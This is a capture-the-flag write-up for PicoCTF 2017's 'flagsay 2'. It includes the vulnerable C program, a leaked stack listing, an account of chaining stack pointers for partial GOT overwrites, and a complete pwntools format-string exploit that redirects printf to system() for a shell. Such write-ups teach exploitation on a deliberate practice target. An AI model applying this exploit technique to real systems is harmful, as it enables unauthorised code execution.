### Solved by Swappage

flagsay 2 was the "enhanced version" of flagsay, this was another format string vulnerability challenge, but this time we didn't have direct control over the stack.

To exploit this i used the following trick: by using format strings, if you find, in the leak of the stack, one address that points to another address also on the stack, you can abuse this situation to change the second pointer to a value of choice.

Ok this explanation sucks but here's the practical example that i abused on this challenge.. oh, and here is the source anyway

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FIRSTCHAROFFSET 129
#define LINELENGTH 35
#define NEWLINEOFFSET 21
#define LINECOUNT 6

#define BUFFLEN 1024

char flag[] = "               _                                        \n"
	          "              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     \n"
	          "             //                                   /     \n"
	          "            //                                   /      \n"
	          "           //                                   /       \n"
	          "          //                                   /        \n"
	          "         //                                   /         \n"
	          "        //                                   /          \n"
	          "       //___________________________________/           \n"
	          "      //                                                \n"
	          "     //                                                 \n"
	          "    //                                                  \n"
	          "   //                                                   \n"
	          "  //                                                    \n"
	          " //                                                     \n";

void placeInFlag(char * flag, char * str){
	char * ptr = flag + FIRSTCHAROFFSET;
	char * lastInLine = ptr + LINELENGTH;
	size_t charRemaining = strlen(str);
	size_t linesDone = 0;
	while(charRemaining > 0 && linesDone < LINECOUNT){
		if(ptr == lastInLine){
			ptr += NEWLINEOFFSET;
			lastInLine += NEWLINEOFFSET + LINELENGTH;
			linesDone++;
			continue;
		}
		ptr[0] = str[0];
		ptr++;
		str++;
		charRemaining--;
	}

}



int main(int argc, char **argv){
	setbuf(stdout, NULL);

	size_t flagSize = strlen(flag) + 1; //need to remember null terminator
	char * input = (char *)malloc(sizeof(char) * flagSize);
	input[flagSize-1] = '\x0';
	char * tempFlag = (char *)malloc(sizeof(char) * flagSize);
	while(1){
		strncpy(tempFlag, flag, flagSize);
		tempFlag[flagSize-1] = '\x0';
		fgets(input, flagSize, stdin);
		char * temp = strchr(input, '\n');
		if(temp != NULL){
			temp[0] = '\x0';
		}

		placeInFlag(tempFlag, input);
		printf(tempFlag);
	}
	free(tempFlag);
	free(input);
}
```

generally when working with these kind of bugs, because we are working with relative addresses anyway, it's better to turn off aslr on the testing machine, so it becomes easier at first to understand what's going on.

the first thing i did was to leak quite a bunch of stack addresses:

		1 0x804a0da
		2 0xf7fa35a0
		3 0x8048722
		4 0x804a247
		5 0x804a368
		6 0x804a008
		7 0x358
		8 0xf7fa33dc
		9 0xffffd360
		10 (nil)
		11 0xf7e08276
		12 0x1
		13 0xf7fa3000
		14 (nil)
		15 0xf7e08276			<--- a libc address
		16 0x1
		17 0xffffd3f4			<--- points to the address in position 53
		18 0xffffd3fc			<--- points to the address in position 55
		19 (nil)
		20 (nil)
		21 (nil)
		...
		47 0x80486d0
		48 0x8048740
		49 0xf7fe88b0
		50 0xffffd3ec
		51 0xf7ffd918
		52 0x1
		53 0xffffd57f
		54 (nil)
		55 0xffffd5a0
		56 0xffffdb5c
		57 0xffffdb73
		58 0xffffdb82
		59 0xffffdb93
		60 0xffffdba8
		61 0xffffdbb3
		62 0xffffdbc8
		63 0xffffdbdc
		64 0xffffdbea
		65 0xffffdbf5
		66 0xffffdc1b
		67 0xffffdc2c
		68 0xffffdc36


it might not look quite obvious by just looking at the above list, but the pointers in position 17 and 18 points respectively to the memory location that is leaked at position 53 and 55

this means that we can use format strings to write arbitrary pointers at position 53 and 55, and then use these pointers later on to achieve an arbitrary write what where primitive

This time, again, we cant write pointers all in one shot, we have to make good use of partial overwrites, in this particular scenario, i used the first pointer (in position 17) to modify the value at position 53 so that it would point to position 54; then aligned the pointers properly so that they would point to higher and lower parts of addresses in the GOT.

I really used paper and pencil to make sense of the pointers, so here is some sort of rapresentation where i can show my 1337 paint m4d sk1llz

![](/images/2017/PicoCTF/flagsay2/1.png)

once we managed to write what we want on the GOT it's practically game over, we just make the application to invoke our desired function and we have a shell.

```python
#!/usr/bin/python

from pwn import *

#r = remote("localhost", 1337)
r = remote("shell2017.picoctf.com", 44887)

raw_input("Attach GDB now")

r.sendline("%15$p %17$p %18$p %53$p %55$p")
pointers = r.recv()
pointers = pointers.split("/")[4].split("   ")[0]

libc = pointers.split(" ")[0]
p1 = pointers.split(" ")[1]
p2 = pointers.split(" ")[2]
p3 = pointers.split(" ")[3]
p4 = pointers.split(" ")[4]

log.info("Pointer 1: " + p1)
log.info("Pointer 2: " + p2)
log.info("Pointer 3: " + p3)
log.info("Pointer 4: " + p4)

#
# libcbase on KALI:  %15$p - 0x18276
# libcbase on debian8: %15$p - 0x19a63
#
log.info("Libc leak: " + libc)
libc = int(libc,16)
libcbase = libc - 0x19a63
system = libcbase + 0x3e3e0

log.info("libc base: " + str(hex(libcbase)))
log.info("system: " + str(hex(system)))

# let's setup the stack
# we are forging the pointer @ p4 location that is at %55$p

#1 modify p3 to point to p4 HSB
# *p3 => *p2+2
p2lsb = p2[-4:]
p2lsb = int(p2lsb, 16)
log.info("p2lsb: " + str(hex(p2lsb)))
p2lsb = p2lsb + 2
log.info("p2lsb dest: " + str(hex(p2lsb)))
r.sendline("%" + str(p2lsb-0x81) + "c%17$hn")
r.recv()



#2 modify p4 lsb with arbitrary bytes
# we are going to use printf@GOT here
# fgets@GOT: 08049974
r.sendline("%39151c%18$hn")
r.recv()
r.sendline("%1923c%53$hn")
r.recv()

#
# create a second pointer on the stack to point at printf@GOT+2
# we use %54$p
#
p2lsb = p2lsb -6
log.info("p2lsb dest: " + str(hex(p2lsb)))
r.sendline("%" + str(p2lsb-0x81) + "c%17$hn")
r.recv()

r.sendline("%39153c%53$hn")
r.recv()

p2lsb = p2lsb +2
log.info("p2lsb dest: " + str(hex(p2lsb)))
r.sendline("%" + str(p2lsb-0x81) + "c%17$hn")
r.recv()

r.sendline("%1923c%53$hn")
r.recv()

#
# now %55$p points to printf@GOT
# %54p points to printf@GOT + 2
# time to write system()

systemstr = str(hex(system))
systemlsb = "0x" + systemstr[-4:]
systemhsb = systemstr[:6]

systemlsb = int(systemlsb, 16)
systemhsb = int(systemhsb, 16)
charcount = systemhsb - systemlsb


r.sendline("%" + str(systemlsb - 0x81) + "c%55$hn%" + str(charcount) + "c%54$hn")

r.interactive()
```
